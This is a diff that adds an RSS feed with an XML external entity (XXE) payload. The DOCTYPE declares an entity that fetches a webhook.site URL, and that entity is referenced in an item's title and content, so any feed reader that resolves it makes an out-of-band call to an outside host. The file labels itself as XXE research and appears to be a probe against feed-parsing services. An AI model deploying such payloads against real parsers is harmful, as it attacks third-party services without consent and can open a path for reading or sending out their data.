@@ -1,0 +1,17 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE rss [<!ENTITY xxe SYSTEM "http://webhook.site/f34e1577-b464-45fc-a799-9d5f31086476/oob-entity-ghpages">]>
+<rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom">
+<channel>
+<title>Test Feed</title>
+<link>https://wetakush.github.io/</link>
+<language>ru</language>
+<item>
+<title>Test Article &xxe;</title>
+<link>https://wetakush.github.io/article1</link>
+<guid>https://wetakush.github.io/article1</guid>
+<pubDate>Tue, 04 Jul 2023 04:20:00 +0300</pubDate>
+<category>native-draft</category>
+<content:encoded><![CDATA[<p>Test content for XXE research &xxe;</p>]]></content:encoded>
+</item>
+</channel>
+</rss>
